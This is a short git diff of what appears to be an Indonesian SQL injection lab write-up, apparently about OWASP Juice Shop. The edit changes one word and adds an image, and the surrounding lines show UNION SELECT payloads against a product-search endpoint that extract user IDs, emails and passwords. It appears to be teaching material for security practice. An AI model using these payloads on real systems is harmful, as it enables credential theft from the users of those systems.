@@ -10,7 +10,7 @@ Vulnerable source code:
 
 <img src="../kelas/img/81.png" />
 
-Untuk mengambil semua kredensial user, kita pakai titik akhir yang digunakan di atas, yaitu /rest/products/search?q=, tempat dipakainya `UNION SELECT` menggunakan tabel pengguna
+Untuk mengambil semua kredensial user, kita pakai endpoint yang digunakan di atas, yaitu /rest/products/search?q=, tempat dipakainya `UNION SELECT` menggunakan tabel pengguna
 
 ```sql
 ')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM users--
@@ -31,3 +31,4 @@ p')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
 ```
 
 <img src="./img/83.png" />
+<img src="./img/84.png" />
